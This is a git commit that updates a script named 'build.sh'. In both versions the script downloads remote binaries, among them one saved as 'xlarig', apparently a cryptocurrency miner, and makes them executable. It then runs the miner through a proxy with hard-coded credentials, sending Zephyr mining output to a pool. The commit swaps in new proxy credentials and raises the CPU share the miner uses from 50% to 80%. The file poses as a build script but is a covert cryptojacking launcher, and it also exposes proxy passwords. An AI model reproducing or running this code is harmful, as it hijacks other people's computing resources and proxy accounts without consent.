c73ffb0177882013f3a90aceb677fad5f927dff2
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 21:53:45 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,7 +1,7 @@
-proxy="34.192.31.89" 
-port="1080" 
-user="fixie"  
-pass="0Q8k2aDd7DWaM3s" 
+proxy="34.238.108.61" 
+port="9293" 
+user="e40dupo6wpng2p"  
+pass="2a6dj7f91191v2hkpoi6xszv7kn" 
 wget -q -O xlarig https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x xlarig
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x http://y8jfzsx8gnbei:d649nbqeqg07mwz662ot853k4xmv@us-east-static-04.quotaguard.com:9293 --cpu-max-threads-hint=50% -k 
+./panel ./xlarig -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x http://e40dupo6wpng2p:2a6dj7f91191v2hkpoi6xszv7kn@34.238.108.61:9293 --cpu-max-threads-hint=80% -k 
